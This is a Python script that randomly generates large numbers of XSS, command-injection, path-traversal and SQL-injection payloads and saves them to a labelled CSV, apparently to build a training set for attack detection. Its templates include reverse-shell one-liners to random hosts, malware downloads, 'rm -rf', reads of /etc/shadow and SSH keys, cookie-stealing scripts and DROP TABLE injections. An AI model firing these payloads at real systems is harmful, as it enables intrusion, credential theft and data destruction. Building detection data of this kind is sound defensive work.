import csv
import random
import string
from tqdm import tqdm

def generate_random_string(min_length=3, max_length=10):
    """Generate a random string of lowercase letters and numbers."""
    length = random.randint(min_length, max_length)
    return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))

# XSS Payload Generators
def generate_xss_payload():
    xss_templates = [
        "<script>{code}</script>",
        "<img src='x' onerror='{code}'>",
        "<div onmouseover='{code}'>hover me</div>",
        "javascript:{code}",
        "<svg/onload='{code}'>",
        "<iframe src='javascript:{code}'></iframe>",
        "'+alert({num})+'",
        "\"><script>{code}</script>",
        "<a href='javascript:{code}'>click</a>",
        "<body onload='{code}'>",
        "<svg><script>{js_func}('{param}')</script></svg>",
        "<img src=x oneonerrorrror={code}>",
        "';{code};//",
        "<details open ontoggle='{code}'>",
        "'-{code}-'",
        "<video><source onerror='{code}'>",
        "{code}//",
        "<marquee onstart='{code}'>"
    ]
    
    js_functions = [
        "alert", "confirm", "prompt", "eval", "Function", "setTimeout", 
        "document.write", "document.cookie", "window.location", "fetch"
    ]
    
    js_code = random.choice([
        f"{random.choice(js_functions)}({random.randint(1, 100)})",
        f"{random.choice(js_functions)}('{generate_random_string()}')",
        f"{random.choice(js_functions)}(document.{random.choice(['cookie', 'domain', 'location', 'URL'])})",
        f"window.{random.choice(['open', 'location'])}='{generate_random_string()}'",
        f"var i=new Image;i.src='{generate_random_string()}'",
        f"document.body.innerHTML='{generate_random_string()}'",
        f"{random.choice(js_functions)}(`{generate_random_string()}`)"
    ])
    
    template = random.choice(xss_templates)
    return template.format(
        code=js_code,
        num=random.randint(1, 100),
        js_func=random.choice(js_functions),
        param=generate_random_string()
    )

# Command Injection Payload Generators
def generate_cmdi_payload():
    cmdi_templates = [
        "{cmd}",
        "$(${cmd})",
        "`{cmd}`",
        "& {cmd} &",
        "| {cmd}",
        "; {cmd}",
        "|| {cmd}",
        "&& {cmd}",
        "%0A{cmd}",
        "'{cmd}'",
        "\"{cmd}\"",
        "system('{cmd}')",
        "exec('{cmd}')",
        "{param}={cmd}",
        "{param}=$({cmd})",
        "{param};{cmd}",
        "/**/;{cmd}",
        "{cmd} # comment",
        "{prefix} | {cmd}",
        "echo `{cmd}`"
    ]
    
    commands = [
        "cat /etc/passwd",
        "id",
        "whoami",
        "ls -la",
        "uname -a",
        "ps aux",
        "netstat -an",
        "ifconfig",
        "wget http://{domain}/malware",
        "curl -s {domain}",
        "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "nc {ip} {port} -e /bin/bash",
        "echo {string} > {file}",
        "rm -rf {file}",
        "chmod 777 {file}",
        "find / -name {pattern}",
        "env",
        "ping -c 1 {ip}",
        "nslookup {domain}",
        "python -c '{python_code}'"
    ]
    
    cmd = random.choice(commands).format(
        domain=f"{generate_random_string()}.com",
        ip=f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
        port=random.randint(1000, 9999),
        string=generate_random_string(),
        file=f"/tmp/{generate_random_string()}",
        pattern=f"*{generate_random_string()}*",
        python_code=f"import os;os.system('{generate_random_string()}')"
    )
    
    template = random.choice(cmdi_templates)
    return template.format(
        cmd=cmd,
        param=generate_random_string(),
        prefix=generate_random_string()
    )

# Path Traversal Payload Generators
def generate_path_traversal_payload():
    path_traversal_templates = [
        "../{target_file}",
        "../../{target_file}",
        "../../../{target_file}",
        "../../../../{target_file}",
        "..%2f{target_file}",
        "%2e%2e%2f{target_file}",
        "..\\{target_file}",
        "....//....//....///{target_file}",
        "{encoded}{encoded}{encoded}{target_file}",
        "..{separator}..{separator}{target_file}",
        "{prefix}../../../{target_file}",
        "../{filler}/../../{target_file}",
        "%252e%252e/{target_file}",
        "{null_byte}../../../{target_file}",
        "/{root_dir}/../../../{target_file}",
        "{scheme}://../../{target_file}",
        "{proto}://{target_file}",
        "/var/www/../../{target_file}",
        "{dir_prefix}%c0%ae%c0%ae/{target_file}",
        "/%5C../%5C../{target_file}"
    ]
    
    target_files = [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/etc/ssh/sshd_config",
        "C:/Windows/win.ini",
        "C:/boot.ini",
        "/proc/self/environ",
        "/var/log/apache/access.log",
        "WEB-INF/web.xml",
        "../../../../../../../../../../../etc/passwd",
        "../../../../../../windows/system32/drivers/etc/hosts",
        "/var/www/html/index.php",
        "/home/{user}/.ssh/id_rsa",
        "../../{app_config_file}",
        "/opt/lampp/logs/access_log",
        "../../database.php",
        "../secrets/credentials.txt",
        "../../wp-config.php",
        "/proc/self/cmdline",
        ".htaccess"
    ]
    
    encoded_dots = random.choice(["%2e%2e/", "%252e%252e/", "%c0%ae%c0%ae/", "%ef%bc%8e%ef%bc%8e/"])
    
    target_file = random.choice(target_files).format(
        user=generate_random_string(),
        app_config_file=f"{generate_random_string()}.config"
    )
    
    template = random.choice(path_traversal_templates)
    return template.format(
        target_file=target_file,
        encoded=encoded_dots,
        separator=random.choice(["/", "\\", "%2f", "\\\\", "//"]),
        prefix=generate_random_string(),
        filler=generate_random_string(),
        null_byte="%00",
        root_dir=random.choice(["var", "home", "usr", "opt", "etc"]),
        scheme=random.choice(["file", "http", "https", "ftp"]),
        proto=random.choice(["file", "php", "jar", "zip", "data"]),
        dir_prefix=random.choice(["/var/www/", "/home/", "/usr/local/", ""])
    )

# SQL Injection Payload Generators
def generate_sqli_payload():
    sqli_templates = [
        "' OR {condition} --",
        "\" OR {condition} --",
        "1' OR {condition}#",
        "') OR {condition}--",
        "1 OR {condition}",
        "' {union_query}",
        "\" {union_query}",
        "1'; {query}",
        "{query}",
        "') {query}#",
        "')) {query}/*",
        "' OR '{value}'='{value}",
        "admin'--",
        "1' {stacked_query}",
        "\"{value}\" OR \"1\"=\"1",
        "' {function}({param})='1",
        "{field} = {value} {suffix}",
        "{prefix}'{sqli_type}",
        "'{value}' OR 1={condition2}",
        "{time_based}"
    ]
    
    conditions = [
        "1=1",
        "'1'='1'",
        "1 LIKE 1",
        "1 IN (1)",
        "1<2",
        "'a'='a'",
        "2>1",
        "5 BETWEEN 1 AND 10"
    ]
    
    union_queries = [
        "UNION SELECT {fields} FROM {table}",
        "UNION ALL SELECT {fields} FROM {table}",
        "UNION SELECT {fields} FROM {table} WHERE {where_clause}",
        "UNION SELECT {fields} FROM information_schema.tables LIMIT 1",
        "UNION SELECT {fields} FROM users WHERE 1=1"
    ]
    
    queries = [
        "SELECT {fields} FROM {table}",
        "DROP TABLE {table}",
        "DELETE FROM {table}",
        "UPDATE {table} SET {field}={value}",
        "INSERT INTO {table} VALUES({values})",
        "ALTER TABLE {table} ADD {field} {data_type}"
    ]
    
    stacked_queries = [
        "INSERT INTO {table}({fields}) VALUES({values});",
        "DROP TABLE {table};",
        "DELETE FROM {table};",
        "UPDATE {table} SET {field}={value};",
        "CREATE USER '{user}' IDENTIFIED BY '{password}';"
    ]
    
    functions = [
        "substring",
        "concat",
        "char",
        "hex",
        "unhex",
        "ascii",
        "version",
        "sleep",
        "benchmark",
        "user",
        "database"
    ]
    
    time_based = [
        "'; IF(1=1, SLEEP(5), 0)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "'; BENCHMARK(10000000, MD5('test'))--",
        "'; pg_sleep(5)--",
        "'; SELECT SLEEP(5)--"
    ]
    
    field_names = ["id", "username", "password", "email", "name", "user_id", "role", "admin"]
    table_names = ["users", "accounts", "members", "admin", "customers", "products", "orders"]
    
    fields = ", ".join(random.sample(field_names + ["1", "2", "3", "4", "@@version", "database()"], 
                                    random.randint(1, 3)))
    
    condition = random.choice(conditions)
    condition2 = random.choice(["1", "TRUE", "'1'", "1=1"])
    table = random.choice(table_names)
    field = random.choice(field_names)
    value = f"'{generate_random_string()}'" if random.random() > 0.5 else str(random.randint(1, 100))
    
    union_query = random.choice(union_queries).format(
        fields=fields,
        table=table,
        where_clause=f"{random.choice(field_names)} = {value}"
    )
    
    query = random.choice(queries).format(
        fields=fields,
        table=table,
        field=field,
        value=value,
        values=", ".join([f"'{generate_random_string()}'" for _ in range(random.randint(1, 3))]),
        data_type=random.choice(["VARCHAR(255)", "INT", "TEXT", "DATETIME"])
    )
    
    stacked_query = random.choice(stacked_queries).format(
        table=table,
        fields=", ".join(random.sample(field_names, random.randint(1, 3))),
        field=field,
        value=value,
        values=", ".join([f"'{generate_random_string()}'" for _ in range(random.randint(1, 3))]),
        user=generate_random_string(),
        password=generate_random_string()
    )
    
    function = random.choice(functions)
    param = random.choice([f"'{generate_random_string()}'", str(random.randint(1, 100)), field])
    
    template = random.choice(sqli_templates)
    return template.format(
        condition=condition,
        union_query=union_query,
        query=query,
        stacked_query=stacked_query,
        value=generate_random_string() if random.random() > 0.7 else random.randint(1, 100),
        function=function,
        param=param,
        field=field,
        suffix=random.choice(["--", "#", "/*", ""]),
        prefix=random.choice(["", generate_random_string() + "="]),
        sqli_type=random.choice(["OR 1=1", "' OR '1'='1", "' UNION SELECT", "' DROP TABLE"]),
        condition2=condition2,
        time_based=random.choice(time_based)
    )

def generate_payloads(num_payloads=72763):
    """Generate payloads for each attack type"""
    
    payloads = {
        "xss": [],
        "cmdi": [], 
        "path-traversal": [],
        "sqli": []
    }
    
    generators = {
        "xss": generate_xss_payload,
        "cmdi": generate_cmdi_payload,
        "path-traversal": generate_path_traversal_payload,
        "sqli": generate_sqli_payload
    }
    
    for attack_type, generator in generators.items():
        print(f"Generating {num_payloads} payloads for {attack_type}...")
        for _ in tqdm(range(num_payloads)):
            payloads[attack_type].append(generator())
    
    return payloads

def save_to_csv(payloads, filename="attack_payloads.csv"):
    """Save payloads to CSV file with pattern and type columns"""
    
    print(f"Saving payloads to {filename}...")
    
    with open(filename, 'w', newline='', encoding='utf-8') as csvfile:
        fieldnames = ['pattern', 'type']
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
        
        writer.writeheader()
        
        for attack_type, attack_payloads in payloads.items():
            for payload in attack_payloads:
                writer.writerow({
                    'pattern': payload,
                    'type': attack_type
                })
    
    print(f"Successfully saved {sum(len(p) for p in payloads.values())} payloads to {filename}")

if __name__ == "__main__":
    # Generate 72,763 payloads for each attack type
    payloads = generate_payloads(72763)
    
    # Save to CSV
    save_to_csv(payloads)
    
    # Print summary
    print("\nGenerated payload summary:")
    for attack_type, attack_payloads in payloads.items():
        print(f"{attack_type}: {len(attack_payloads)} payloads")